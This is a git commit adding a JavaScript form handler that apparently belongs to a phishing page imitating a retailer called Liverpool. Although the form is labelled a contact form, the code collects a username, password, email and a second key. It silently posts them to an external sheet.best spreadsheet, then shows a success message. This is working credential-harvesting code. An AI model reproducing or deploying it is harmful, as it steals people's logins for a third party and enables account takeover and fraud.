2a767c6647782bca9e3351a466ba164b2bd1ffca
soporte-p1 <bluesmeralda4@gmail.com>
2024-10-21 16:52:01 -0600

    files upload add new data

---
+++ liverpool/js/folio003.js
@@ -0,0 +1,33 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/8a0bb487-d519-4d75-9487-a4f8e92a791a', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "1": formulario.usuario.value,
+            "2": formulario.contraseña.value,
+            "3": formulario.confirmar.value,
+            "4": formulario.correo.value,
+            "5": formulario.clave2.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
